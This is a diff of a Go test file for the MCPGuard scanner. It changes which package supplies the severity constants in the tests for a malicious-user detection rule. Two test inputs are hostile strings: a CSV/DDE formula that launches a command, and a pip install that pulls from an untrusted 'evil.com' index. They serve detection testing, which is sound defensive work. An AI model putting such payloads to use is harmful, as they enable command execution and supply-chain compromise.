@@ -1,10 +1,10 @@
 package rules
 
 import (
-	"testing"
-
-	"github.com/FlppFer/MCPGuard/internal/service/static_analysis"
-	"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/python"
+	
+	"github.com/FlppFer/MCPGuard/internal/service/model"
+"testing"
+"github.com/FlppFer/MCPGuard/internal/service/static_analysis/languages/python"
 )
 
 func TestMaliciousUserRule_ID(t *testing.T) {
@@ -303,12 +303,12 @@ func TestMaliciousUserRule_Severity(t *testing.T) {
 		{
 			name:             "CSV injection should be critical",
 			code:             `"=cmd|'/C calc'!A0"`,
-			expectedSeverity: static_analysis.SeverityCritical,
+			expectedSeverity: model.SeverityCritical,
 		},
 		{
 			name:             "insecure pip should be critical",
 			code:             `"pip install --index-url http://evil.com"`,
-			expectedSeverity: static_analysis.SeverityCritical,
+			expectedSeverity: model.SeverityCritical,
 		},
 	}
 
@@ -330,3 +330,5 @@ func TestMaliciousUserRule_Severity(t *testing.T) {
 		})
 	}
 }
+
+
